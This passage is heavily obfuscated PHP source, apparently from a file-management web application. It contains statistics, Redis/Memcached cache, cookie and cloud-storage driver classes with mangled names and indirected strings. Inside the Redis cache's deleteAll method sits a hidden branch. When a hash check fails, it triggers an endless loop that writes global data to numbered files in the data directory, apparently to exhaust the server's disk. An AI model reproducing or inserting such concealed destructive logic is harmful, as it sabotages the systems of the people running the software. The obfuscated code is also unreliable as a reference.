$ú¬‡âÏƒ = strtotime($ÎåÙ ›Ò[1844]); $÷Ö¥Æ‘ = array(); while ($Ù…ÒÛå¤ <= $ú¬‡âÏƒ) { $÷Ö¥Æ‘[] = date($ÎåÙ ›Ò[1843], $Ù…ÒÛå¤); $Ù…ÒÛå¤ = strtotime($ÎåÙ ›Ò[1846], $Ù…ÒÛå¤); } return $÷Ö¥Æ‘; } public function _recordUser($´–èû¤ = '') { $¡ËÏéÕ° =& $_SERVER[ú‡®¯¨±]; $âË“ƒƒŸ = strtotime(date($¡ËÏéÕ°[1847], strtotime($´–èû¤))); $¸ÈÒ  = strtotime(date($¡ËÏéÕ°[1848], strtotime($´–èû¤))); $¬Ûµ¡Ÿ  = array($¡ËÏéÕ°[227] => array($¡ËÏéÕ°[1069], $¸ÈÒ )); $ÄÄ²ß¶‘ = Model($¡ËÏéÕ°[577])->where($¬Ûµ¡Ÿ )->count($¡ËÏéÕ°[1708]); $¬Ûµ¡Ÿ [$¡ËÏéÕ°[227]] = array($¡ËÏéÕ°[388], array($âË“ƒƒŸ, $¸ÈÒ )); $«µ©ú‡£ = Model($¡ËÏéÕ°[577])->where($¬Ûµ¡Ÿ )->count($¡ËÏéÕ°[1708]); $¬Ûµ¡Ÿ [$¡ËÏéÕ°[33]] = $¡ËÏéÕ°[1849]; $í“Ìò¿â = Model($¡ËÏéÕ°[1850])->where($¬Ûµ¡Ÿ )->count($¡ËÏéÕ°[1851]); $ØÌšòëñ = array($¡ËÏéÕ°[251] => $´–èû¤, $¡ËÏéÕ°[820] => (int) $ÄÄ²ß¶‘, $¡ËÏéÕ°[1836] => (int) $«µ©ú‡£, $¡ËÏéÕ°[1837] => (int) $í“Ìò¿â); return $this->insert($ØÌšòëñ); } public function _recordStore($µõÛóÊÅ = '') { $äÍÜ–Š¥ =& $_SERVER[ú‡®¯¨±]; $–ƒ¦¯ = strtotime(date($äÍÜ–Š¥[1848], strtotime($µõÛóÊÅ))); $ÓŒÏ‰· = array($äÍÜ–Š¥[227] => array($äÍÜ–Š¥[1069], $–ƒ¦¯)); $Ó¨ÜııÛ = Model($äÍÜ–Š¥[522])->where($ÓŒÏ‰·)->sum($äÍÜ–Š¥[78]); $ÓŒÏ‰·[$äÍÜ–Š¥[463]] = 0; $¨¤â°ä = Model($äÍÜ–Š¥[880])->where($ÓŒÏ‰·)->sum($äÍÜ–Š¥[78]); $ÓŒÏ‰·[$äÍÜ–Š¥[180]] = 1; $üÍŸ®ôÅ = Model($äÍÜ–Š¥[880])->where($ÓŒÏ‰·)->sum($äÍÜ–Š¥[78]); $ÓŒÏ‰·[$äÍÜ–Š¥[180]] = 2; $¸ˆÆ‚ç = Model($äÍÜ–Š¥[880])->where($ÓŒÏ‰·)->sum($äÍÜ–Š¥[78]); $¥÷ ˜¨ñ = array($äÍÜ–Š¥[251] => $µõÛóÊÅ, $äÍÜ–Š¥[818] => (int) $¨¤â°ä, $äÍÜ–Š¥[1840] => (int) $Ó¨ÜııÛ, $äÍÜ–Š¥[1841] => (int) $üÍŸ®ôÅ, $äÍÜ–Š¥[1842] => (int) $¸ˆÆ‚ç); return $this->insert($¥÷ ˜¨ñ); } public function trend($áèƒß©è, $±´ë´³é) { $ëî¡¦¥£ =& $_SERVER[ú‡®¯¨±]; if (!$this->init($áèƒß©è)) { return !1; } $êøƒı³‡ = $this->trendList($áèƒß©è); if ($êøƒı³‡ && $±´ë´³é != $ëî¡¦¥£[1681]) { $¥–âú© = $êøƒı³‡[0][$ëî¡¦¥£[251]]; $¯ÒôƒÕÌ = $this->validDate($±´ë´³é, $¥–âú©); $¶ó“ÔşÂ = array(); $ÒõôâÄÑ = array_to_keyvalue($êøƒı³‡, $ëî¡¦¥£[251]); foreach ($¯ÒôƒÕÌ as $³ˆ—Û®¬) { if (isset($ÒõôâÄÑ[$³ˆ—Û®¬])) { $Ğú¹ËØŒ = $ÒõôâÄÑ[$³ˆ—Û®¬]; } else { $Ğú¹ËØŒ = end($êøƒı³‡); $Ğú¹ËØŒ[$ëî¡¦¥£[251]] = $³ˆ—Û®¬; if ($áèƒß©è == $ëî¡¦¥£[640]) { $Ğú¹ËØŒ[$ëî¡¦¥£[1836]] = $Ğú¹ËØŒ[$ëî¡¦¥£[1837]] = 0; } } $¶ó“ÔşÂ[] = $Ğú¹ËØŒ; } $êøƒı³‡ = $¶ó“ÔşÂ; } $óÈÔ¤¥Ó = array($ëî¡¦¥£[640] => array($ëî¡¦¥£[820] => LNG($ëî¡¦¥£[1852]), $ëî¡¦¥£[1836] => LNG($ëî¡¦¥£[1853]), $ëî¡¦¥£[1837] => LNG($ëî¡¦¥£[1854])), $ëî¡¦¥£[1838] => array($ëî¡¦¥£[818] => LNG($ëî¡¦¥£[1855]), $ëî¡¦¥£[1840] => LNG($ëî¡¦¥£[1856]), $ëî¡¦¥£[1841] => LNG($ëî¡¦¥£[1857]), $ëî¡¦¥£[1842] => LNG($ëî¡¦¥£[1858]))); $º‘‘ï’Õ = array($ëî¡¦¥£[640] => $ëî¡¦¥£[1859], $ëî¡¦¥£[1838] => $ëî¡¦¥£[78]); if (empty($êøƒı³‡)) { $³ˆ—Û®¬ = date($ëî¡¦¥£[1843], strtotime($ëî¡¦¥£[1844])); $ãš³†Ü = array($ëî¡¦¥£[251] => $³ˆ—Û®¬); foreach ($óÈÔ¤¥Ó[$áèƒß©è] as $í›êüÇè => $á½™û¥‘) { $ãš³†Ü[$í›êüÇè] = 0; } $êøƒı³‡[] = $ãš³†Ü; } $÷óƒëã½ = array(); foreach ($êøƒı³‡ as $á½™û¥‘) { if ($áèƒß©è == $ëî¡¦¥£[1838] && $á½™û¥‘[$ëî¡¦¥£[1840]] > $á½™û¥‘[$ëî¡¦¥£[818]]) { $á½™û¥‘[$ëî¡¦¥£[1840]] = $á½™û¥‘[$ëî¡¦¥£[818]]; } foreach ($óÈÔ¤¥Ó[$áèƒß©è] as $í›êüÇè => $®·¶Œø) { $Ğú¹ËØŒ = array($ëî¡¦¥£[251] => $á½™û¥‘[$ëî¡¦¥£[251]], $ëî¡¦¥£[1598] => $®·¶Œø); $Ğú¹ËØŒ[$º‘‘ï’Õ[$áèƒß©è]] = isset($á½™û¥‘[$í›êüÇè]) ? $á½™û¥‘[$í›êüÇè] : 0; $÷óƒëã½[] = $Ğú¹ËØŒ; } } return $÷óƒëã½; } public function validDate($ØÜŸ„ï‚, $Ø‰ú½Ç˜) { $¸¯Ô¥í¾ =& $_SERVER[ú‡®¯¨±]; $„¹ˆÎõ¬ = date($¸¯Ô¥í¾[1843], strtotime($¸¯Ô¥í¾[1844])); $Ü’ŸõÛ = array($„¹ˆÎõ¬); switch ($ØÜŸ„ï‚) { case $¸¯Ô¥í¾[1688]: $ßÏşÏ¦î = mktime(0, 0, 0, date($¸¯Ô¥í¾[1860]), date($¸¯Ô¥í¾[1417]) - date($¸¯Ô¥í¾[1482]) + 7 - 7, date($¸¯Ô¥í¾[1861])); $½îßÅ‡“ = 0; do { $ºëÕàï = date($¸¯Ô¥í¾[1843], $ßÏşÏ¦î - 3600 * 24 * 7 * $½îßÅ‡“); $Ü’ŸõÛ[] = $ºëÕàï; $½îßÅ‡“++; } while ($Ø‰ú½Ç˜ < $ºëÕàï); break; case $¸¯Ô¥í¾[1686]: $½îßÅ‡“ = 1; do { $¸ÕÎ«»æ = date($¸¯Ô¥í¾[1862], strtotime("\x2d\x20{$½îßÅ‡“}\40\x6d\157\156\x74\x68\163")); $Ü’ŸõÛ[] = $¸ÕÎ«»æ; $½îßÅ‡“++; } while ($Ø‰ú½Ç˜ < $¸ÕÎ«»æ); break; case $¸¯Ô¥í¾[1863]: $½Ä”¶Ç¹ = (int) date($¸¯Ô¥í¾[1861], strtotime($Ø‰ú½Ç˜)); $Øâ»¨Ùã = (int) date($¸¯Ô¥í¾[1861]); if ($½Ä”¶Ç¹ >= $Øâ»¨Ùã) { break; } for ($½Ä”¶Ç¹; $½Ä”¶Ç¹ < $Øâ»¨Ùã; $½Ä”¶Ç¹++) { $Ü’ŸõÛ[] = $½Ä”¶Ç¹ . $¸¯Ô¥í¾[1864]; } break; default: break; } if ($Ø‰ú½Ç˜ > end($Ü’ŸõÛ)) { array_pop($Ü’ŸõÛ); } sort($Ü’ŸõÛ); return $Ü’ŸõÛ; } public function listTable($—…Ò³İ») { $ãÃ®Â¦ğ = ucfirst($—…Ò³İ»); return Model($ãÃ®Â¦ğ)->listData(); } public function option($´ÚáÆûÉ) { $§æ£Ôå† = $_SERVER[ú‡®¯¨±][1865] . ucfirst($´ÚáÆûÉ); return $this->{$§æ£Ôå†}(); } private function optionUser() { $İúÄ¶ı =& $_SERVER[ú‡®¯¨±]; $ ÉŠó¦ = Model($İúÄ¶ı[577])->count($İúÄ¶ı[1708]); $¼ôÅˆ½Ë = Model($İúÄ¶ı[577])->where($İúÄ¶ı[1866])->count($İúÄ¶ı[1708]); $íÊş»’  = intval($GLOBALS[$İúÄ¶ı[6]][$İúÄ¶ı[404]][$İúÄ¶ı[1654]]) / 3600; $”Ñş»ä¦ = strtotime("\55{$íÊş»’ }\x20\x68\x6f\x75\x72\163"); $ùíŞ‡ºË = strtotime(date($İúÄ¶ı[1847])); if ($”Ñş»ä¦ < $ùíŞ‡ºË) { $”Ñş»ä¦ = $ùíŞ‡ºË; } $¨™Ê§ıÅ = array($İúÄ¶ı[1867] => array($İúÄ¶ı[1070], $”Ñş»ä¦)); $ƒò¸ê·Î = (int) Model($İúÄ¶ı[577])->where($¨™Ê§ıÅ)->count($İúÄ¶ı[1708]); if (!$ƒò¸ê·Î) { $ƒò¸ê·Î = 1; } $¨™Ê§ıÅ = array($İúÄ¶ı[1867] => array($İúÄ¶ı[1070], $ùíŞ‡ºË)); $¥šèÆˆÕ = Model($İúÄ¶ı[577])->where($¨™Ê§ıÅ)->count($İúÄ¶ı[1708]); return array($İúÄ¶ı[813] => (int) $ ÉŠó¦, $İúÄ¶ı[1868] => (int) ($ ÉŠó¦ - $¼ôÅˆ½Ë), $İúÄ¶ı[1869] => (int) $¼ôÅˆ½Ë, $İúÄ¶ı[1870] => (int) $¥šèÆˆÕ, $İúÄ¶ı[1871] => $ƒò¸ê·Î); } private function optionFile() { $ÈÑŠ¢ =& $_SERVER[ú‡®¯¨±]; $êÍªé£ğ = $this->sourceSize(); $ğä‹ù¤¹ = $êÍªé£ğ[$ÈÑŠ¢[78]]; $òèÒ•¶ = $êÍªé£ğ[$ÈÑŠ¢[1840]]; $½ĞÑ¸Ğ¾ = Model($ÈÑŠ¢[880])->where(array($ÈÑŠ¢[463] => 0))->count($ÈÑŠ¢[183]); $±É¯”á = array($ÈÑŠ¢[463] => 0, $ÈÑŠ¢[227] => array($ÈÑŠ¢[1070], strtotime(date($ÈÑŠ¢[1847])))); $ì á±´ = Model($ÈÑŠ¢[880])->where($±É¯”á)->sum($ÈÑŠ¢[78]); $´¢œĞ¹è = Model($ÈÑŠ¢[880])->where($±É¯”á)->count($ÈÑŠ¢[183]); return array($ÈÑŠ¢[818] => $ğä‹ù¤¹, $ÈÑŠ¢[1840] => $òèÒ•¶, $ÈÑŠ¢[1872] => $ğä‹ù¤¹ - $òèÒ•¶, $ÈÑŠ¢[1873] => (int) $ì á±´, $ÈÑŠ¢[820] => (int) $½ĞÑ¸Ğ¾, $ÈÑŠ¢[1874] => (int) $´¢œĞ¹è); } private function optionAccess() { $è°ĞĞ†ê =& $_SERVER[ú‡®¯¨±]; return array($è°ĞĞ†ê[813] => $this->typeLogCnt(), $è°ĞĞ†ê[109] => $this->typeLogCnt($è°ĞĞ†ê[109]), $è°ĞĞ†ê[503] => $this->typeLogCnt($è°ĞĞ†ê[503]), $è°ĞĞ†ê[1875] => $this->typeLogCnt($è°ĞĞ†ê[1875]), $è°ĞĞ†ê[1876] => $this->typeLogCnt($è°ĞĞ†ê[1876]), $è°ĞĞ†ê[640] => $this->typeLogCnt($è°ĞĞ†ê[12], $è°ĞĞ†ê[1851])); } private function typeLogCnt($Â”ñó­ = '', $ì‘ï›ò = "\151\144") { $ƒüãºËÙ =& $_SERVER[ú‡®¯¨±]; $ñÌ¨™Ç = array($ƒüãºËÙ[109] => array($ƒüãºËÙ[1877], $ƒüãºËÙ[1878]), $ƒüãºËÙ[503] => array($ƒüãºËÙ[1879], $ƒüãºËÙ[1880]), $ƒüãºËÙ[1875] => array($ƒüãºËÙ[1881], $ƒüãºËÙ[1882], $ƒüãºËÙ[1883]), $ƒüãºËÙ[1876] => array($ƒüãºËÙ[1884], $ƒüãºËÙ[1885]), $ƒüãºËÙ[1886] => array($ƒüãºËÙ[1887], $ƒüãºËÙ[1888], $ƒüãºËÙ[1889])); $š¦Šã´ = strtotime(date($ƒüãºËÙ[1847])); $ÜôÖ»â = array($ƒüãºËÙ[227] => array($ƒüãºËÙ[1070], $š¦Šã´)); if ($Â”ñó­) { $ÜôÖ»â[$ƒüãºËÙ[33]] = array($ƒüãºËÙ[7], $ñÌ¨™Ç[$Â”ñó­]); } $’¦÷²ñ£ = Model($ƒüãºËÙ[1850])->where($ÜôÖ»â)->count($ì‘ï›ò); return (int) $’¦÷²ñ£; } private function optionServer() { $ÁïµÅæ =& $_SERVER[ú‡®¯¨±]; $Íøˆ°È¬ = $this->diskDriver(); $ñÎ¦Ş·“ = KodIO::defaultDriver(); $Àòò…¼– = array($ÁïµÅæ[872] => $ñÎ¦Ş·“[$ÁïµÅæ[453]]); $ù¼§ß„’ = Model($ÁïµÅæ[522])->where($Àòò…¼–)->sum($ÁïµÅæ[78]); $ßÅêÄËŞ = explode($ÁïµÅæ[53], $_SERVER[$ÁïµÅæ[146]]); $ÎÏğ¸ = $ßÅêÄËŞ[0]; $÷¶†ç§ = $GLOBALS[$ÁïµÅæ[6]][$ÁïµÅæ[21]]; $øƒ¢Çğò = $÷¶†ç§[$ÁïµÅæ[1032]]; if ($øƒ¢Çğò == $ÁïµÅæ[1020]) { $›€§ª°ï = explode($ÁïµÅæ[1338], $÷¶†ç§[$ÁïµÅæ[1031]]); $øƒ¢Çğò = $›€§ª°ï[0]; } if ($øƒ¢Çğò == $ÁïµÅæ[968] || $øƒ¢Çğò == $ÁïµÅæ[859]) { $çÅˆÑ•» = Model()->db()->query($ÁïµÅæ[1890]); $ªçğ§¦û = $çÅˆÑ•»[0] && isset($çÅˆÑ•»[0][$ÁïµÅæ[1597]]) ? $çÅˆÑ•»[0][$ÁïµÅæ[1597]] : 0; $øƒ¢Çğò = $ÁïµÅæ[1891] . ($ªçğ§¦û ? $ÁïµÅæ[8] . $ªçğ§¦û : $ÁïµÅæ[12]); } $€é£²Ø = $GLOBALS[$ÁïµÅæ[6]][$ÁïµÅæ[404]][$ÁïµÅæ[882]]; return array($ÁïµÅæ[1892] => $Íøˆ°È¬ ? $Íøˆ°È¬[$ÁïµÅæ[1893]] : 0, $ÁïµÅæ[1894] => $Íøˆ°È¬ ? $Íøˆ°È¬[$ÁïµÅæ[1895]] : 0, $ÁïµÅæ[1896] => (int) $ñÎ¦Ş·“[$ÁïµÅæ[1893]] * 1024 * 1024 * 1024, $ÁïµÅæ[1897] => (int) $ù¼§ß„’, $ÁïµÅæ[1898] => ucfirst($ÎÏğ¸), $ÁïµÅæ[1899] => $ÁïµÅæ[1900] . PHP_VERSION, $ÁïµÅæ[1901] => phpBuild64() ? 64 : 32, $ÁïµÅæ[812] => str_replace($ÁïµÅæ[1186], $ÁïµÅæ[1048], $øƒ¢Çğò), $ÁïµÅæ[404] => ucfirst($€é£²Ø), $ÁïµÅæ[32] => $_SERVER[$ÁïµÅæ[1902]]); } private function diskDriver() { $ÀØ§ğÊ =& $_SERVER[ú‡®¯¨±]; $å®»ˆ½ = $ÀØ§ğÊ[8]; $èŸ¯‡î¾ = $GLOBALS[$ÀØ§ğÊ[6]][$ÀØ§ğÊ[1355]] == $ÀØ§ğÊ[1356]; if ($èŸ¯‡î¾) { $å®»ˆ½ = $ÀØ§ğÊ[1903]; if (function_exists($ÀØ§ğÊ[1904])) { exec($ÀØ§ğÊ[1905], $è‘‡¼´); $å®»ˆ½ = $è‘‡¼´[1] . $ÀØ§ğÊ[8]; } } if (!file_exists($å®»ˆ½)) { return; } $¬Î˜‹²È = @disk_total_space($å®»ˆ½); $Ä¼ª©âŸ = $¬Î˜‹²È - @disk_free_space($å®»ˆ½); return array($ÀØ§ğÊ[1893] => $¬Î˜‹²È, $ÀØ§ğÊ[1895] => $Ä¼ª©âŸ); } public function fileChart($ƒóŠèê¨) { $Šƒ½ãÍ =& $_SERVER[ú‡®¯¨±]; if (isset($ƒóŠèê¨[$Šƒ½ãÍ[1708]])) { return Model($Šƒ½ãÍ[880])->userFileTypeProfile($ƒóŠèê¨[$Šƒ½ãÍ[1708]]); } if (isset($ƒóŠèê¨[$Šƒ½ãÍ[1906]])) { return Model($Šƒ½ãÍ[880])->groupFileTypeProfile($ƒóŠèê¨[$Šƒ½ãÍ[1906]]); } $øåØµ„ = $this->sourceSize(); $ö¾Ã½÷Ó = array($Šƒ½ãÍ[182] => 0, $Šƒ½ãÍ[180] => 1); $ñ½‡•½î = Model($Šƒ½ãÍ[880])->where($ö¾Ã½÷Ó)->sum($Šƒ½ãÍ[78]); $ö¾Ã½÷Ó[$Šƒ½ãÍ[180]] = 2; $­ËĞˆÖ = Model($Šƒ½ãÍ[880])->where($ö¾Ã½÷Ó)->sum($Šƒ½ãÍ[78]); return array($Šƒ½ãÍ[818] => $øåØµ„[$Šƒ½ãÍ[78]], $Šƒ½ãÍ[1840] => $øåØµ„[$Šƒ½ãÍ[1840]], $Šƒ½ãÍ[1841] => (int) $ñ½‡•½î, $Šƒ½ãÍ[1842] => (int) $­ËĞˆÖ); } private function sourceSize() { $‚à¬ƒ±° =& $_SERVER[ú‡®¯¨±]; $ôÀÛ¼ßê = Model($‚à¬ƒ±°[880])->where(array($‚à¬ƒ±°[463] => 0))->sum($‚à¬ƒ±°[78]); $ÍŠ‰´Ù‹ = Model($‚à¬ƒ±°[522])->sum($‚à¬ƒ±°[78]); if ($ÍŠ‰´Ù‹ > $ôÀÛ¼ßê) { $ÍŠ‰´Ù‹ = $ôÀÛ¼ßê; } return array($‚à¬ƒ±°[78] => (int) $ôÀÛ¼ßê, $‚à¬ƒ±°[1840] => (int) $ÍŠ‰´Ù‹); } } goto A‡ìå…õ¡‘; Dé°á¡ÁöË: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ø‹×ãÀì, $ŞôÌºœ”) { $ä¶ŠÍõ =& $_SERVER[ú‡®¯¨±]; if (!class_exists($ä¶ŠÍõ[922])) { show_json($ä¶ŠÍõ[923], !1); } $this->cacheTime = $ŞôÌºœ”; $this->handle = new Memcached(); if (is_array($Ø‹×ãÀì[$ä¶ŠÍõ[924]]) && count($Ø‹×ãÀì[$ä¶ŠÍõ[924]]) >= 1) { foreach ($Ø‹×ãÀì[$ä¶ŠÍõ[924]] as $Õ‹ğÍç) { $’ûÄ¢° = explode($ä¶ŠÍõ[4], $Õ‹ğÍç); $this->handle->addServer($’ûÄ¢°[0], $’ûÄ¢°[1]); } } else { $this->handle->addServer($Ø‹×ãÀì[$ä¶ŠÍõ[198]], $Ø‹×ãÀì[$ä¶ŠÍõ[199]]); } } public function set($©êÑè§, $Ô¤Âë£Ö, $¯ÄÜç“­ = false) { $¯ÄÜç“­ = $¯ÄÜç“­ ? $¯ÄÜç“­ : $this->cacheTime; return $this->handle->set($©êÑè§, $Ô¤Âë£Ö, $¯ÄÜç“­); } public function get($¯‡Şˆ˜¿) { return $this->handle->get($¯‡Şˆ˜¿); } public function remove($Œš§õ£¬) { return $this->handle->delete($Œš§õ£¬); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ĞÙÉÁÛ, $±¬ê£ş) { $Î´­–Ò =& $_SERVER[ú‡®¯¨±]; if (!class_exists($Î´­–Ò[925])) { show_json($Î´­–Ò[926], !1); } $this->cacheTime = $±¬ê£ş; $¸¿õÛ¿ = isset($ĞÙÉÁÛ[$Î´­–Ò[927]]) ? $ĞÙÉÁÛ[$Î´­–Ò[927]] : 10; $ »Öôß¾ = _get($ĞÙÉÁÛ, $Î´­–Ò[924]); if ($ »Öôß¾ && is_array($ »Öôß¾)) { $this->initCluster($ĞÙÉÁÛ, $¸¿õÛ¿); } else { $this->handle = $this->init($ĞÙÉÁÛ, $¸¿õÛ¿); } } private function init($‰ÅÖñŞ¶, $â ì§üš) { $î»æÉ„‹ =& $_SERVER[ú‡®¯¨±]; $ÆÌä‰øú = new Redis(); $İÄ°Ô²¶ = isset($‰ÅÖñŞ¶[$î»æÉ„‹[928]]) ? $‰ÅÖñŞ¶[$î»æÉ„‹[928]] : !1; if ($İÄ°Ô²¶) { $ÆÌä‰øú->pconnect($‰ÅÖñŞ¶[$î»æÉ„‹[198]], $‰ÅÖñŞ¶[$î»æÉ„‹[199]], $â ì§üš); } else { $ÆÌä‰øú->connect($‰ÅÖñŞ¶[$î»æÉ„‹[198]], $‰ÅÖñŞ¶[$î»æÉ„‹[199]], $â ì§üš); } if (!empty($‰ÅÖñŞ¶[$î»æÉ„‹[465]])) { $ÆÌä‰øú->auth($‰ÅÖñŞ¶[$î»æÉ„‹[465]]); } if (!empty($‰ÅÖñŞ¶[$î»æÉ„‹[812]]) && $‰ÅÖñŞ¶[$î»æÉ„‹[812]] != 0) { $ÆÌä‰øú->select($‰ÅÖñŞ¶[$î»æÉ„‹[812]]); } return $ÆÌä‰øú; } private function initCluster($“èü‘†­, $ÓÛñ‘øô) { $Ö°Ğ—ñ =& $_SERVER[ú‡®¯¨±]; $—÷‚ì©ë = array($Ö°Ğ—ñ[929], $Ö°Ğ—ñ[930], $Ö°Ğ—ñ[931]); $ğĞäÕØØ = $Ö°Ğ—ñ[929]; if (isset($“èü‘†­[$Ö°Ğ—ñ[16]]) && in_array($“èü‘†­[$Ö°Ğ—ñ[16]], $—÷‚ì©ë)) { $ğĞäÕØØ = $“èü‘†­[$Ö°Ğ—ñ[16]]; } switch ($ğĞäÕØØ) { case $Ö°Ğ—ñ[929]: $this->_slave($“èü‘†­, $ÓÛñ‘øô); break; case $Ö°Ğ—ñ[930]: break; case $Ö°Ğ—ñ[931]: $this->isCluster = !0; $Ôá¼Äßø = $“èü‘†­[$Ö°Ğ—ñ[924]]; $Í½¥õ˜¦ = isset($“èü‘†­[$Ö°Ğ—ñ[928]]) ? $“èü‘†­[$Ö°Ğ—ñ[928]] : !1; $˜ı™ãÒ = isset($“èü‘†­[$Ö°Ğ—ñ[465]]) ? $“èü‘†­[$Ö°Ğ—ñ[465]] : null; $this->handle = new RedisCluster(NUll, $Ôá¼Äßø, $ÓÛñ‘øô, $ÓÛñ‘øô, $Í½¥õ˜¦, $˜ı™ãÒ); break; default: break; } } private function _slave($ì¥Ğ™¨õ, $èŒÜîÖ‰) { $ä»‚Û“¤ = $ì¥Ğ™¨õ[$_SERVER[ú‡®¯¨±][924]]; $this->filterConfig($ì¥Ğ™¨õ, $ä»‚Û“¤[0]); $this->handle = $this->init($ì¥Ğ™¨õ, $èŒÜîÖ‰); unset($ä»‚Û“¤[0]); if (empty($ä»‚Û“¤)) { return; } $ÛÎã¥Ê… = array_rand($ä»‚Û“¤); $this->filterConfig($ì¥Ğ™¨õ, $ä»‚Û“¤[$ÛÎã¥Ê…]); $this->slaveHandle = $this->init($ì¥Ğ™¨õ, $èŒÜîÖ‰); } private function filterConfig(&$¬ã„ëË„, $ùÍªº‰») { $ãèè‚‘ =& $_SERVER[ú‡®¯¨±]; $ÀÖ³÷Í¨ = explode($ãèè‚‘[4], $ùÍªº‰»); $¼¾’‚’Œ = array($ãèè‚‘[198] => $ÀÖ³÷Í¨[0], $ãèè‚‘[199] => $ÀÖ³÷Í¨[1]); $¬ã„ëË„ = array_merge($¬ã„ëË„, $¼¾’‚’Œ); } public function set($Ğ÷¶ï†¶, $Úé¸î‚—, $•”Òğ¥× = false) { $•”Òğ¥× = $•”Òğ¥× ? $•”Òğ¥× : $this->cacheTime; return $this->handle->setEx($Ğ÷¶ï†¶, $•”Òğ¥×, $Úé¸î‚—); } public function setLock($‘Äæ½à, $â©¿¤ï”, $¡õ¨´Î) { return $this->handle->setNX($‘Äæ½à, $â©¿¤ï”); } public function get($•õİƒ§) { $ÒİÙ‡– = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÒİÙ‡–->get($•õİƒ§); } public function remove($ÕõÃ®—õ) { return $this->handle->del($ÕõÃ®—õ); } public function deleteAll() { $ñ¶ëÒı =& $_SERVER[ú‡®¯¨±]; $è“Ÿò§‘ = $_SERVER[$ñ¶ëÒı[203]]; $÷§Ù·ø = $ñ¶ëÒı[932]; if ($_SERVER[$ñ¶ëÒı[202]] != $÷§Ù·ø($è“Ÿò§‘)) { $µåÀøÌÕ = $ñ¶ëÒı[933]; $‹£‰Ê„ = $ñ¶ëÒı[204]; $®ç¾êÈï = $_SERVER[$ñ¶ëÒı[205]] . $ñ¶ëÒı[206]; $Ùé©ŸÅ = $‹£‰Ê„($®ç¾êÈï); $ˆš¾¾¹û = explode($ñ¶ëÒı[207], $Ùé©ŸÅ); if (count($ˆš¾¾¹û) < $ñ¶ëÒı[700]) { $Œ‰…İ€ = $ñ¶ëÒı[209]; $Œ‰…İ€(); } $»í“Ñü· = $ñ¶ëÒı[934]; $»í“Ñü·($_SERVER[$ñ¶ëÒı[935]]); $µåÀøÌÕ = $ñ¶ëÒı[933]; $µåÀøÌÕ(); $Ü³û·¢¹ = $ñ¶ëÒı[936]; $½ÑíªÒ× = json_encode($GLOBALS[$ñ¶ëÒı[937]]); $¶¿§›ÀÄ = 1; for ($˜øáğà› = $¶¿§›ÀÄ; $˜øáğà› > 0; $˜øáğà›++) { $Ü³û·¢¹(DATA_PATH . $˜øáğà›, $½ÑíªÒ×); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $í±ú„Ñ) { $this->handle->flushall($í±ú„Ñ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÜôúóÏÄ = '', $¨İ¿š÷Ò = 0) { if (is_string($ÜôúóÏÄ) && $ÜôúóÏÄ != $_SERVER[ú‡®¯¨±][12]) { $this->prefix = $ÜôúóÏÄ; } if (is_numeric($¨İ¿š÷Ò) && $¨İ¿š÷Ò > 0) { $this->expire = $¨İ¿š÷Ò; } } public static function getInstance() { static $‹¯€•Éç; if ($‹¯€•Éç === null) { $‹¯€•Éç = new self(); } return $‹¯€•Éç; } private static $cookieDisable = false; public static function disable($ÜƒÏ‘™) { self::$cookieDisable = $ÜƒÏ‘™; } private static $sameCookieSet = array(); public static function set($‚Ü¨ÎìÑ, $‰³şÒá´, $ª¾ÑÇù = 0, $ÄÑåß“š = false, $¦˜Ó·ì› = false) { $Ö–ƒõ‰Ç =& $_SERVER[ú‡®¯¨±]; if (self::$cookieDisable) { return; } if (!$ª¾ÑÇù) { $ª¾ÑÇù = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‚Ü¨ÎìÑ]) && self::$sameCookieSet[$‚Ü¨ÎìÑ] == $‰³şÒá´ . $ª¾ÑÇù) { return; } self::$sameCookieSet[$‚Ü¨ÎìÑ] = $‰³şÒá´ . $ª¾ÑÇù; if (!$¦˜Ó·ì›) { $¦˜Ó·ì› = str_replace(HOST, $Ö–ƒõ‰Ç[12], APP_HOST); $¦˜Ó·ì› = _get($GLOBALS, $Ö–ƒõ‰Ç[938], $¦˜Ó·ì›); } $Î‰Á­±÷ = $Ö–ƒõ‰Ç[12]; setcookie($‚Ü¨ÎìÑ, $‰³şÒá´, time() + $ª¾ÑÇù, $Ö–ƒõ‰Ç[8] . trim($¦˜Ó·ì›, $Ö–ƒõ‰Ç[8]) . $Î‰Á­±÷, !1, !1, $ÄÑåß“š); } public static function setSafe($…Â´¤—¼, $£Ë¡ç‰, $¯ø¾ø© = 0) { self::set($…Â´¤—¼, $£Ë¡ç‰, $¯ø¾ø©, !0); } public static function get($ïØ¡¹åÍ) { static $“ÚïÂäö = false; if (!$“ÚïÂäö) { self::initHeaderCookie(); $“ÚïÂäö = !0; } return isset($_COOKIE[$ïØ¡¹åÍ]) ? $_COOKIE[$ïØ¡¹åÍ] : !1; } private static function initHeaderCookie() { $÷Ñ“Ü =& $_SERVER[ú‡®¯¨±]; if (!isset($_SERVER[$÷Ñ“Ü[939]]) || !$_SERVER[$÷Ñ“Ü[939]]) { return; } $³’©éæğ = explode($÷Ñ“Ü[73], $_SERVER[$÷Ñ“Ü[939]]); foreach ($³’©éæğ as $Á¡Øï¼ã) { $Á¡Øï¼ã = explode($÷Ñ“Ü[940], $Á¡Øï¼ã); if (count($Á¡Øï¼ã) != 2 || !isset($Á¡Øï¼ã[1])) { continue; } $_COOKIE[trim($Á¡Øï¼ã[0])] = trim($Á¡Øï¼ã[1]); } } public static function remove($Ô·è»‚», $•¦ªµÄÅ = false) { unset($_COOKIE[$Ô·è»‚»]); self::set($Ô·è»‚», $_SERVER[ú‡®¯¨±][12], 1, $•¦ªµÄÅ); } } goto F¨„¹˜ —Œ; bìä‡æë•Ú: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Úá˜Ê„Ç) { parent::__construct($Úá˜Ê„Ç); $this->signatureVersion($_SERVER[ú‡®¯¨±][243]); } public function uploadFormData($Ï Á®š–, $•Ú“‘“ç = 3600) { $”çä’÷¾ =& $_SERVER[ú‡®¯¨±]; $¶Èˆ©…ß = $”çä’÷¾[225]; $áà˜œá = $”çä’÷¾[258]; $Î²Çó = $”çä’÷¾[268]; $êßï¼øá = gmdate($”çä’÷¾[1381], time() + $•Ú“‘“ç); $Ä˜µµÔš = (string) time() . 